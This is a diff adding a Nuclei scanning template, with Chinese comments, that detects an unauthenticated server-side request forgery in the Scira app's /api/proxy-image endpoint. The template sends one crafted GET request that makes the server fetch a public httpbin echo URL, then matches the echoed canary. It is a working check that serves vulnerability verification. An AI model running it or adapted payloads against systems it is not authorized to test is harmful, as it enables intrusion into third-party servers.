@@ -1,0 +1,42 @@
+# Scira /api/proxy-image SSRF 验证模板（单请求、无状态、只读）
+# 运行:
+#   nuclei -t scira-proxy-image-ssrf.yaml -u http://{{TARGET}}/
+#   代理到 Burp: nuclei -t scira-proxy-image-ssrf.yaml -u http://{{TARGET}}/ -proxy http://127.0.0.1:8080
+# 说明: payload 指向 httpbin 公开回显端点, 仅验证「服务器代发请求并回显响应体」, 不触碰任何内网目标。
+
+id: scira-proxy-image-ssrf-2026
+
+info:
+  name: zaidmukaddam Scira /api/proxy-image Server-Side Request Forgery
+  author: researcher
+  severity: high
+  description: |
+    Scira (through commit e1692f5, 2026-08-13) exposes /api/proxy-image which fetches a
+    user-controlled url server-side and returns the response body without scheme, address,
+    or content-type validation, allowing unauthenticated SSRF (CWE-918).
+  reference:
+    - https://github.com/zaidmukaddam/scira/blob/main/app/api/proxy-image/route.ts
+  classification:
+    cwe-id: CWE-918
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: scira,ssrf,cwe-918,image-proxy
+
+http:
+  - raw:
+      - |
+        GET /api/proxy-image?url=https%3A%2F%2Fhttpbin.org%2Fresponse-headers%3FX-SSRF-Canary%3Dscira-poc HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "X-SSRF-Canary"
+          - "scira-poc"
+        condition: and
+        part: body
